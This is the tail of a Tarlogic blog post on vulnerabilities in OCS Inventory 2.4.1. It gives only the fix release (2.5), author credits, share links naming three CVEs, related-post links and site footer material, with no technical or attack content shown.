OCS Inventory has released a [new version](https://github.com/OCSInventory-NG/OCSInventory-ocsreports/releases/tag/2.5) (2.5) to fix the issues

### Greetings

Jaume Llopis ([@jks\_\_\_](https://twitter.com/jks___)), Pablo Martínez ([@Xassiz](https://twitter.com/xassiz)) and Juan Manuel Fernández ([@TheXC3LL](https://twitter.com/TheXC3LL))

Discover our work and [cybersecurity services](https://www.tarlogic.com/cybersecurity-services/) at [www.tarlogic.com](https://www.tarlogic.com/)

Share this article

[Facebook](https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/blog/vulnerabilities-in-ocs-inventory-2-4-1/) -
[Twitter](https://x.com/share?text=Vulnerabilities in OCS Inventory 2.4.1&url=https://www.tarlogic.com/blog/vulnerabilities-in-ocs-inventory-2-4-1/) -
[Linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tarlogic.com/blog/vulnerabilities-in-ocs-inventory-2-4-1/&title=Vulnerabilities in OCS Inventory 2.4.1&summary=Analysis and exploitation of multiple vulnerabilities in OCS Inventory 2.4.1. Vulnerabiltiies: CVE-2018-12482, CVE-2018-12483, CVE-2018-14473)

##### Related Posts

[![AD CS: from ManageCA to RCE](data:image/gif;base64...)](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)
[###### AD CS: from ManageCA to RCE](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)
Written by:
- Pablo Martínez, Kurosh Dabbagh

14 - February - 2022

[![Red Team Tales 0x02: from SQLi to Domain Admin](data:image/gif;base64...)](https://www.tarlogic.com/blog/red-team-tales-from-sqli-to-domain-admin/)
[###### Red Team Tales 0x02: from SQLi to Domain Admin](https://www.tarlogic.com/blog/red-team-tales-from-sqli-to-domain-admin/)
Written by:
- Jose Manuel Aparicio

02 - November - 2018

[![Analyzing an RFID scanner: bad habits never die](data:image/gif;base64...)](https://www.tarlogic.com/blog/analyzing-an-rfid-scanner/)
[###### Analyzing an RFID scanner: bad habits never die](https://www.tarlogic.com/blog/analyzing-an-rfid-scanner/)
Written by:
- Juan Manuel Fernandez

12 - June - 2020

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blackarrow-tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:
Madrid
 Quintanavides 13-23,
 Business Park Vía Norte 2nd building,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now 💬](#top)


